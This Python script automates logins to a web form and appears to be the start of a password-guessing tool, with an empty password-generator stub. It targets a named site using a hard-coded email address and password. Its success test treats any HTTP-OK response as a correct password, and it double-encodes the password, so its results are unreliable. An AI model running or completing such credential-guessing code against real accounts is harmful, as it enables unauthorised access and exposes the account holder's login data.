from bs4 import BeautifulSoup
import urllib.parse
import requests


def parser(html_link, username, password):
    s = requests.session()
    response_result = s.get(html_link)
    if response_result.ok:
        soup = BeautifulSoup(response_result.text, 'lxml')
        form_tag = soup.find("form")
        form_action = form_tag.get("action")
        form_method = form_tag.get("method")
        post_data_dict = {}
        for form_input in form_tag.find_all("input"):
            if form_input.get("type") != "submit":
                key = form_input.get("name")
                if key == 'user[login]':
                    value = username
                else:
                    value = form_input.get("value")
                if value is None:
                    value = ''
                post_data_dict[key] = value
        post_data_dict.update({urllib.parse.quote("user[password]"): urllib.parse.quote(password)})
        res = None
        if form_method == 'post':
            res = s.post(html_link+form_action, data=post_data_dict)
        if form_method == 'get':
            res = s.get(html_link+form_action, params=post_data_dict)
        if res is not None and res.ok:
            print(username + " password is " + password)
            return True
        else:
            print(res.status_code)
        return False


def passwdGen():
    pass


if __name__ == '__main__':
    result = parser("http://www.yimigit.com", "wei.zhou1@1mifudao.com", "Eckel2826\\0")
    if result:
        print("found the password")
    else:
        print("password Wrong")
